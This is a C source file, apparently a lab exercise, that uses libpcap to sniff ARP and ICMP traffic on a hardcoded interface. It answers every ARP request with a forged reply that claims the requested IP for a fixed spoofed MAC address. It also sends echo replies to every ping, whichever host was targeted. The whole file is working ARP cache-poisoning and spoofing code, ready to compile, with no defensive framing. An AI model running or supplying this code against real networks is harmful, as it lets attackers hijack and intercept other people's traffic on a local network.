#include "header_struct.h"
#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h> // For if_nametoindex
#include <linux/if_packet.h> // For struct sockaddr_ll
#include <string.h> // For memcpy
#include <unistd.h> // For close()

// ARP Header Structure
struct arpheader {
    unsigned short arp_hrd;      // Hardware type
    unsigned short arp_pro;      // Protocol type
    unsigned char arp_hln;       // Hardware address length
    unsigned char arp_pln;       // Protocol address length
    unsigned short arp_op;       // Operation code (request or reply)
    unsigned char arp_sha[6];    // Sender hardware address (MAC)
    unsigned char arp_sip[4];    // Sender IP address
    unsigned char arp_tha[6];    // Target hardware address (MAC)
    unsigned char arp_tip[4];    // Target IP address
};

// Function to calculate the checksum for the IP header
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Function to calculate the ICMP checksum
unsigned short icmp_checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Function to send an ARP reply
void send_arp_reply(const u_char *packet, const char *interface) {
    struct ethheader *eth = (struct ethheader *)packet;
    struct arpheader *arp = (struct arpheader *)(packet + sizeof(struct ethheader));

    // Construct an ARP reply
    unsigned char reply_packet[sizeof(struct ethheader) + sizeof(struct arpheader)];
    struct ethheader *eth_reply = (struct ethheader *)reply_packet;
    struct arpheader *arp_reply = (struct arpheader *)(reply_packet + sizeof(struct ethheader));

    // Fill in the Ethernet header
    memcpy(eth_reply->ether_dhost, eth->ether_shost, 6); // Destination MAC = Sender MAC
    // 6 octect
    memcpy(eth_reply->ether_shost, "\x08\x00\x27\x46\x8a\xe7", 6); // Spoofed source MAC (replace with your MAC)
    eth_reply->ether_type = htons(0x0806); // ARP type

    // Fill in the ARP header
    arp_reply->arp_hrd = htons(1); // Hardware type: Ethernet
    arp_reply->arp_pro = htons(0x0800); // Protocol type: IPv4
    arp_reply->arp_hln = 6; // Hardware address length
    arp_reply->arp_pln = 4; // Protocol address length
    arp_reply->arp_op = htons(2); // ARP reply
    memcpy(arp_reply->arp_sha, "\x08\x00\x27\x46\x8a\xe7", 6); // Spoofed sender MAC (replace with your MAC)
    memcpy(arp_reply->arp_sip, arp->arp_tip, 4); // Spoofed sender IP = Target IP from the request
    memcpy(arp_reply->arp_tha, arp->arp_sha, 6); // Target MAC = Sender MAC from the request
    memcpy(arp_reply->arp_tip, arp->arp_sip, 4); // Target IP = Sender IP from the request

    // Send the ARP reply
    int sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sd < 0) {
        perror("socket() error");
        return;
    }

    // Set the destination address for sendto()
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = if_nametoindex(interface); // Replace with your interface name
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, eth_reply->ether_dhost, ETH_ALEN);

    // Send the packet
    if (sendto(sd, reply_packet, sizeof(reply_packet), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("sendto() error");
    } else {
        printf("Sent ARP reply: It's me!\n");
    }

    close(sd);
}

// Function to send an ICMP Echo Reply
void send_icmp_reply(const u_char *packet, const char *interface) {
    struct ethheader *eth = (struct ethheader *)packet;
    struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));
    int ip_header_length = ip->iph_ihl * 4; // IP header length in bytes
    struct icmpheader *icmp = (struct icmpheader *)((u_char *)ip + ip_header_length);

    // Calculate the ICMP payload length
    int icmp_payload_length = ntohs(ip->iph_len) - ip_header_length - sizeof(struct icmpheader);

    // Construct an ICMP Echo Reply
    unsigned char reply_packet[sizeof(struct ethheader) + sizeof(struct ipheader) + sizeof(struct icmpheader) + icmp_payload_length];
    struct ethheader *eth_reply = (struct ethheader *)reply_packet;
    struct ipheader *ip_reply = (struct ipheader *)(reply_packet + sizeof(struct ethheader));
    struct icmpheader *icmp_reply = (struct icmpheader *)((u_char *)ip_reply + sizeof(struct ipheader));
    unsigned char *icmp_payload_reply = (unsigned char *)((u_char *)icmp_reply + sizeof(struct icmpheader));

    // Fill in the Ethernet header
    memcpy(eth_reply->ether_dhost, eth->ether_shost, 6); // Destination MAC = Sender MAC
    memcpy(eth_reply->ether_shost, eth->ether_dhost, 6); // Source MAC = Destination MAC
    eth_reply->ether_type = htons(0x0800); // IPv4 type

    // Fill in the IP header
    memcpy(ip_reply, ip, sizeof(struct ipheader));
    ip_reply->iph_sourceip = ip->iph_destip; // Swap source and destination IP
    ip_reply->iph_destip = ip->iph_sourceip;
    ip_reply->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader) + icmp_payload_length); // Set correct IP total length
    ip_reply->iph_chksum = 0; // Recalculate checksum
    ip_reply->iph_chksum = checksum((unsigned short *)ip_reply, sizeof(struct ipheader));

    // Fill in the ICMP header
    memcpy(icmp_reply, icmp, sizeof(struct icmpheader));
    icmp_reply->icmp_type = 0; // Echo Reply
    icmp_reply->icmp_chksum = 0; // Recalculate checksum

    // Copy the ICMP payload
    memcpy(icmp_payload_reply, (u_char *)icmp + sizeof(struct icmpheader), icmp_payload_length);

    // Recalculate the ICMP checksum (including the payload)
    icmp_reply->icmp_chksum = icmp_checksum((unsigned short *)icmp_reply, sizeof(struct icmpheader) + icmp_payload_length);

    // Send the ICMP Echo Reply
    int sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sd < 0) {
        perror("socket() error");
        return;
    }

    // Set the destination address for sendto()
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = if_nametoindex(interface); // Replace with your interface name
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, eth_reply->ether_dhost, ETH_ALEN);

    // Send the packet
    if (sendto(sd, reply_packet, sizeof(reply_packet), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("sendto() error");
    } else {
        printf("Sent ICMP Echo Reply!\n");
    }

    close(sd);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ethheader *eth = (struct ethheader *)packet;

    // Check if the packet is an ARP packet
    if (ntohs(eth->ether_type) == 0x0806) { // ARP Ethernet type is 0x0806
        struct arpheader *arp = (struct arpheader *)(packet + sizeof(struct ethheader));

        // Check if it's an ARP request (operation code 1)
        if (ntohs(arp->arp_op) == 0x0001) { // ARP request
            printf("Got an ARP request: Who has %d.%d.%d.%d? Tell %d.%d.%d.%d\n",
                   arp->arp_tip[0], arp->arp_tip[1], arp->arp_tip[2], arp->arp_tip[3],
                   arp->arp_sip[0], arp->arp_sip[1], arp->arp_sip[2], arp->arp_sip[3]);

            // Send an ARP reply claiming "It's me!"
            send_arp_reply(packet, "enp0s3"); // Replace "enp0s3" with your interface name
        }
    }
    // Check if the packet is an IPv4 packet
    else if (ntohs(eth->ether_type) == 0x0800) { // IPv4 Ethernet type is 0x0800
        struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));
        int ip_header_length = ip->iph_ihl * 4; // IP header length in bytes

        // Check if the packet is an ICMP packet
        if (ip->iph_protocol == 1) { // ICMP protocol number is 1
            struct icmpheader *icmp = (struct icmpheader *)((u_char *)ip + ip_header_length);

            // Check if the ICMP packet is an Echo Request (type 8)
            if (icmp->icmp_type == 8) {
                printf("Got an ICMP Echo Request!\n");

                // Send an ICMP Echo Reply
                send_icmp_reply(packet, "enp0s3"); // Replace "enp0s3" with your interface name
            }
        }
    }
}

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "arp || icmp"; // Filter to capture ARP and ICMP packets
    bpf_u_int32 net;

    // Open the network interface for packet capture
    handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); // Replace "enp0s3" with your interface name
    if (handle == NULL) {
        fprintf(stderr, "Error opening device: %s\n", errbuf);
        return 1;
    }

    // Compile the filter expression
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Error compiling filter: %s\n", pcap_geterr(handle));
        return 1;
    }

    // Set the filter
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Error setting filter: %s\n", pcap_geterr(handle));
        return 1;
    }

    // Start capturing packets
    printf("Sniffing for ARP and ICMP packets...\n");
    pcap_loop(handle, -1, got_packet, NULL);

    // Close the handle
    pcap_close(handle);
    return 0;
}